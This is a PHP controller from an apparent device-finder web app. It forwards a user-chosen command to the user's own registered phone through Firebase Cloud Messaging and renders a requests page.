<?php

namespace App\Controllers\clients;



use App\Models\Mod_Finder;
use App\Models\Mod_User;

class Requests extends BaseClientController
{


    public function send_command()
    {
        if (!$this->request->isAJAX()) {
            return $this->response->setJSON([
                'success' => false,
                'message' => 'Invalid request'
            ]);
        }

        try {
            $command = $this->request->getPost('command');
            
            // Get user's devices
            $userModel = new Mod_User();
            $devices = $userModel->get_user_devices_from_profile($this->userId);
            
            if (empty($devices)) {
                return $this->response->setJSON([
                    'success' => false,
                    'message' => 'No connected devices found'
                ]);
            }
            
            // Target the most recent device with an FCM token
            $targetDevice = null;
            foreach ($devices as $device) {
                if (!empty($device['fcm_token'])) {
                    $targetDevice = $device;
                    break;
                }
            }
            
            if (!$targetDevice) {
                 // We found devices, but none had an FCM token
                return $this->response->setJSON([
                    'success' => false,
                    'message' => 'Device found but Cloud Messaging is not active. Please open the app on the device to register.'
                ]);
            }
            
            // Send FCM message
            $firebase = new \App\Libraries\FirebaseLib();
            $payload = [
                'action' => $command,
                'timestamp' => date('Y-m-d H:i:s')
            ];
            
            $result = $firebase->sendDataMessage($targetDevice['fcm_token'], $payload);
            
            if ($result && !isset($result['failure']) && !isset($result['error'])) {
                 return $this->response->setJSON([
                    'success' => true,
                    'message' => 'Command sent to ' . ($targetDevice['device_model'] ?? 'Device') . '. Please wait for data to upload.',
                    'device' => $targetDevice['device_model'] ?? 'Unknown'
                ]);
            } else {
                 return $this->response->setJSON([
                    'success' => false,
                    'message' => 'Firebase Error: ' . (is_array($result) ? json_encode($result) : 'Unknown failure')
                ]);
            }
        } catch (\Exception $e) {
            log_message('error', 'SendCommand Exception: ' . $e->getMessage());
            return $this->response->setJSON([
                'success' => false,
                'message' => 'System Error: ' . $e->getMessage()
            ]);
        }
    }

	public function send_request(){
        // Auth check and init handled in parent

		$pg = 'requests';
		$data['pag'] = 'requests';
		$data["user_info"] = $this->finderModel->basic_user(); // Or $this->userData from parent

        // Stats
        $counts = $this->getUserDataCounts();
        $data = array_merge($data, $counts);

		return view('headers_footers/head_users')
			. view('headers_footers/sidebar_users', $data)
			. view('users/account/'.$pg, $data)
			. view('headers_footers/footer_users');
	}
    
    // send_sleep seems missing based on file view, but if it exists in another version or I missed it...
    // I will only replace what I see.
}
